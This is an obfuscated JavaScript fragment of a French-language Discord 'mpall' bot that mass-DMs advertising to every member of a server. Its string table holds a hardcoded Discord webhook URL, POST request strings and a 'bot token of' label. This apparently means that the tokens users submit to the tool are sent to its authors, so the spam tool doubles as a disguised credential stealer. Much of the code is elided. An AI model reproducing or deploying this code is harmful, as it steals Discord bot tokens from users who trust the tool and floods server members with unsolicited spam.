const _0x1dbf = ['log', '&wsta', 'map', '**Le bot utilisé pour le mp all sera :** `', 'token', 'channel', 'system-sleep', 'collect', 'join', 'xmlhttprequest', ' , ici tu pourra effectuer tes commandes pour pub mp :) \x0a\x0a** Fais &mpall _token de ton bot_ _message a envoyer_** \x0a\x0a **Exemple :** \x0a &mpall Njc5Njk4Nzg2MDkxNjYzMzYw.Xk1I3A.pNlXSFvA9skzsdn5Fqp0gYZ5-q_jk messagedetest', 'Le bot est online!', 'Bot By Sysy & Tatan', '630341759997706241', '[31;1m[', 'error', 'Bot is disconnecting...', 'STREAMING', ' membres. \x0a\x0aMessage :\x0a[36m', 'setActivity', 'reconnecting', 'Merci de préciser un token.', '❎ | **Annulation de la commande...**', ' \x0a\x0aStatistiques globales : \x0a\x0aLe bot a un total de ', 'discriminator', '**Token du bot de : **', 'disconnect', 'username', 'forEach', 'size', '&mpall ', 'react', ' serveurs. \x0aPour un total de ', 'MErci de mentionnez un utilisateur..', 'Vas dans le bon serveur', 'unhandledRejection', 'VIEW_CHANNEL', 'stringify', '[0m\x0a\x0a\x0a ', 'delete', 'catch', 'TOKEN Partener s bot ', 'Hey! @', 'slice', '[32m Tatan terminé avec succès \x0aLaissez le logiciel courir 5 minutes de plus pour être sûr que tout le monde a bien reçu le DM.', 'memberCount', 'createReactionCollector', 'login', 'get', ' membres )', '&wsh', 'Connecter en tant que : ', '_emoji', 'name', 'users', '&wss', 'message', 'Bot reconnecting...', 'ERREUR : Vas dans ton salon', 'Merci de préciser le texte.', 'application/json', 'Envoyer a tous le monde ( ', '\x0a\x0a**Le bot est sur :  **', 'trim', './config', 'user', ' membres)', 'discord.js', 'text', 'https://discordapp.com/api/webhooks/683248119261298714/8dieO2cKCjtzeurRc0afl52Blgywiz8Mca3ef9YL2BGmdoD0sgV1Aa5uNjFW1QO7_kBP', 'setDescription', 'setFooter', 'cache', '680468537869074433', '** membres', '669636514728378378', 'OPP TU N\'a pas les perms', 'Voici les serveurs ou la publicité sera envoyeée.', 'Publicité fini', 'guild', 'mpall système | by Tatan and Sysy', 'author', 'setRequestHeader', 'startsWith', 'POST', 'warn', 'send', 'setColor', 'members', 'member', 'channels', 'tag', ', ici tu pourra effectuer tes commandes pour pub mp :) \x0a\x0a** Fais &mpall _token de ton bot_ _message a envoyer_** \x0a\x0a **Exemple :** \x0a &mpall Njc5Njk4Nzg2MDkxNjYzMzYw.Xk1I3A.pNlXSFvA9skzsdn5Fqp0gYZ5-q_jk messagedetest', '][37m Message envoyer à [36m', '680353407000903681', '668067111834353675', 'setTimestamp', 'reply', 'Message de pub :', 'mentions', 'setAuthor', 'guilds', '\x0a\x0a**Le nom du bot est : **', 'Content-Type', 'then', 'first', 'logger', 'overwritePermissions', 'Client', 'MessageEmbed', 'content', 'displayAvatarURL', 'c\'est la vie', 'split', 'create', 'https://www.twitch.tv/ninja', '&mpall', '#ff0000'];
                ...
                _0x3a31d5['on']('ready', () => {
                    ...
                    if (_0x2cb879 === _0x32b0('0xe')) {
                        ...
                        _0x11cb31[_0x32b0('0x15')]['send'](_0x542411)[_0x32b0('0x2')](_0x510596 => {
                            _0x510596[_0x32b0('0x2f')]('✅') & _0x510596[_0x32b0('0x2f')]('❎');
                            ...
                            _0x43bc2d['on'](_0x32b0('0x17'), async (_0x3b24f8, _0x143829) => {
                                if (_0x3b24f8[_0x32b0('0x44')][_0x32b0('0x45')] === '❎') {
                                    return _0x510596[_0x32b0('0x37')]() & _0x11cb31['channel'][_0x32b0('0x66')](_0x32b0('0x26'));
                                };
                                if (_0x3b24f8[_0x32b0('0x44')][_0x32b0('0x45')] === '✅') {
                                    _0x510596[_0x32b0('0x37')]() & _0x11cb31[_0x32b0('0x15')][_0x32b0('0x66')]('✅ | **Le bot va lancer la pub mp...**');
                                    let _0x3a114d = 0x64;
                                    let _0xcac2b3 = '0';
